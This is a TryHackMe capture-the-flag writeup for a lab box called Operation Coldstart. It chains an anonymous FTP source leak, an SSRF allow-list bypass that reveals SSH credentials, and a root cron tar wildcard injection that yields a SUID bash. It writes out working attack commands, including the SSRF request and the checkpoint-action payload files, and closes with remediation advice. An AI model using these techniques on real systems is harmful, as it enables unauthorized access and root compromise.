# Operation Coldstart — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** Web (SSRF) → Linux Privilege Escalation
**Attack chain:** Anonymous FTP source leak → SSRF allow-list bypass → SSH foothold → tar wildcard injection (root cron) → root

> Educational writeup. All actions performed against an authorized lab target.
> Credentials and flags are partially masked.

---

## Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | `nmap` full port scan | 21 (FTP), 22 (SSH), 80 (HTTP/gunicorn) |
| Initial access (info) | Anonymous FTP | Leaked app source (`backup.tar.gz`) |
| Web exploitation | SSRF via hostname allow-list bypass | Read localhost-only `/admin/notes` |
| Foothold | Leaked SSH credentials | Shell as `webdev` + user flag |
| Privilege escalation | tar wildcard injection in root cron | Root shell + root flag |

---

## 1. Reconnaissance

Full TCP port scan with service/version detection and default scripts:

```bash
nmap -sC -sV -O -p- <TARGET>
```

Key results:

```
21/tcp open  ftp     vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    gunicorn  (URL Preview - Volt Labs)
```

**Analysis:**
- External attack surface is minimal — only three ports. This hints that anything else of interest listens only on `localhost` (relevant later).
- `gunicorn` → Python WSGI server, almost certainly **Flask**.
- The app is titled **"URL Preview"** — a function that takes a user-supplied URL and fetches it server-side. This is a textbook **SSRF** candidate.
- `vsftpd 3.0.5` with **anonymous login allowed** — likely an information-disclosure entry point.

**Hypothesis:** empty perimeter + a server-side fetch feature = use SSRF to reach an internal/localhost-only service.

---

## 2. Anonymous FTP — Source Code Leak

```bash
ftp <TARGET>
# login: anonymous / (empty password)
```

The `pub` directory contained a single archive:

```
-rw-r--r-- 1 ftp ftp 2446 May 09 23:14 backup.tar.gz
```

Downloaded and extracted:

```bash
tar -xzvf backup.tar.gz
# -> README.md  app.py  requirements.txt
```

> Note: `strings` on the `.tar.gz` returns noise — gzip data is compressed (DEFLATE),
> so there are no readable ASCII strings until it is decompressed. Always extract first.

This is a **white-box** scenario: a leaked backup hands us the application source. A real-world equivalent is an exposed backup file or open `.git` directory.

### Source review (`app.py`)

The relevant logic of the `/preview` endpoint:

```python
ALLOWED_HOSTS = {"kestrel.thm"}   # resolves to 127.0.0.1 via /etc/hosts on the box

@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        return "Host not in allow-list", 403
    r = requests.get(target, timeout=3)   # full user-supplied target is forwarded
    ...
```

And the protected admin endpoint:

```python
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
```

**The vulnerability:**
1. `/preview` validates **only the hostname** against the allow-list — no scheme, port, or path check.
2. The allowed host `kestrel.thm` resolves to `127.0.0.1` (local `/etc/hosts`).
3. The original `target` URL is passed verbatim into `requests.get()`.

So a request using `kestrel.thm` as the host passes the allow-list, but the actual fetch hits `127.0.0.1` — and we control the **port and path**. This lets us make the server request its own `/admin/` endpoint. Because that request originates from the server itself, `remote_addr` is `127.0.0.1`, satisfying the admin IP check.

This is SSRF used to bypass an **IP-based access control**: a trusted component is coerced into making the request on our behalf.

---

## 3. SSRF Exploitation

```bash
curl -s 'http://<TARGET>/preview?url=http://kestrel.thm/admin/notes' | sed 's/&lt;/</g'
```

**Confirmation that the protection exists** (direct access from our IP is blocked):

```bash
curl -s -o /dev/null -w "%{http_code}\n" 'http://<TARGET>/admin/notes'
# -> 403   (remote_addr = our external IP, not 127.x)
```

The SSRF request returned the internal note:

```
=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLa????????
- Mara
```

Recovered SSH credentials: `webdev : V0ltLa????????`

---

## 4. Foothold — SSH as `webdev`

```bash
ssh webdev@<TARGET>
# password: V0ltLa????????
```

User flag:

```bash
cat ~/user.txt
# THM{96dc7bd50d2fb98fce??????????????????}
```

### Local enumeration

```bash
id
# uid=1001(webdev) gid=1001(webdev) groups=1001(webdev)   -> no interesting groups

sudo -l
# webdev may not run sudo                                  -> not in sudoers

find / -perm -4000 -type f 2>/dev/null                     -> only standard SUID binaries
getcap -r / 2>/dev/null                                    -> only standard capabilities
systemctl list-timers --all --no-pager                     -> only system timers
```

The classic vectors (sudo, group membership, custom SUID, capabilities, systemd timers) are all clean. Narrowing by elimination points toward **cron** and **writable paths**.

```bash
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|run)/' | grep -v '/home/webdev'
# -> /opt/backups/.keep      (indicates /opt/backups is writable by group webdev)
```

---

## 5. Privilege Escalation — tar Wildcard Injection

The decisive find, a root cron job:

```bash
cat /etc/cron.d/voltlabs-backup
```

```
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

Three conditions combine into a vulnerability:
1. The job runs **as root**, **every minute**.
2. It runs `tar czf ... *` — the `*` is expanded by the **shell** into a list of filenames.
3. `/opt/backups` is **writable** by group `webdev`.

`tar` cannot distinguish a filename from a command-line option. A file named like `--checkpoint-action=...` is parsed by tar as an **option**. Using:

- `--checkpoint=1` — trigger an action every record
- `--checkpoint-action=exec=<cmd>` — execute a command at the checkpoint

we get arbitrary command execution as root.

### Exploit

```bash
cd /opt/backups

# Payload: create a SUID copy of bash
cat > /opt/backups/pwn.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x /opt/backups/pwn.sh

# Crafted "argument" files (-- tells touch the rest is a filename, not options)
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'
```

After ≤60 seconds the root cron expands to roughly:

```
tar czf /var/backups/uploads.tgz --checkpoint=1 --checkpoint-action=exec=sh pwn.sh .keep pwn.sh
```

tar executes `sh pwn.sh` as root, producing the SUID bash:

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root ... /tmp/rootbash

/tmp/rootbash -p     # -p keeps elevated privileges (does not drop euid)
id
# uid=1001(webdev) gid=1001(webdev) euid=0(root)
```

> The `-p` flag is essential: bash drops elevated privileges by default on startup.
> With `-p`, `euid` stays 0 — and Linux permission checks use the effective UID.

Root flag:

```bash
ls /root
cat /root/flag.txt
# THM{e6ee84a483d67ade069??????????????????}
```

### Cleanup

```bash
rm -f /opt/backups/'--checkpoint=1' /opt/backups/'--checkpoint-action=exec=sh pwn.sh' /opt/backups/pwn.sh
```

---

## Credentials / Loot

| # | Credential / Artifact | Type | Source | Method | Used For |
|---|-----------------------|------|--------|--------|----------|
| 1 | `anonymous : (empty)` | FTP | `TARGET:21` | `ftp-anon` / manual | Retrieved `backup.tar.gz` |
| 2 | `webdev : V0ltLa????????` | SSH | `admin_notes.txt` | SSRF `/preview` → `/admin/notes` | Foothold |

---

## Findings & Remediation

| Finding | Severity | Remediation |
|---------|----------|-------------|
| Anonymous FTP exposes source backup | Medium | Disable anonymous FTP; don't store backups in served dirs |
| Plaintext credentials in internal note | High | Never store plaintext creds; rotate exposed secret |
| SSRF: hostname allow-list bypass via local DNS | High | Resolve host, validate final IP against private ranges, rebuild URL, restrict scheme/port |
| Root cron `tar *` wildcard injection | Critical | Use `tar ... -- *` or `./*`; avoid world/group-writable source dirs in root jobs |

---

## Lessons Learned

- **SSRF attacks trust, not just reachability.** Here it bypassed an IP-based access control by making a trusted component issue the request — no internal network needed.
- **Hostname allow-lists are weak** when the name resolves locally and scheme/port/path are unchecked. Validate the resolved IP, not the string.
- **Wildcard injection** is a high-value, easy-to-miss privesc. Reflex trigger: a privileged script/cron running `tar`/`rsync`/`chown`/`chmod` + `*` over a writable directory.
- **Eliminate methodically.** Clean SUID/caps/sudo/timers output is itself information — it narrows the search toward the real (hand-crafted) vector.

---

## Full Chain

```
nmap -> anonymous FTP -> leaked Flask source
   -> SSRF (allow-list bypass via /etc/hosts) -> read /admin/notes
   -> leaked SSH creds -> foothold as webdev
   -> root cron tar wildcard injection -> SUID bash -> root
```
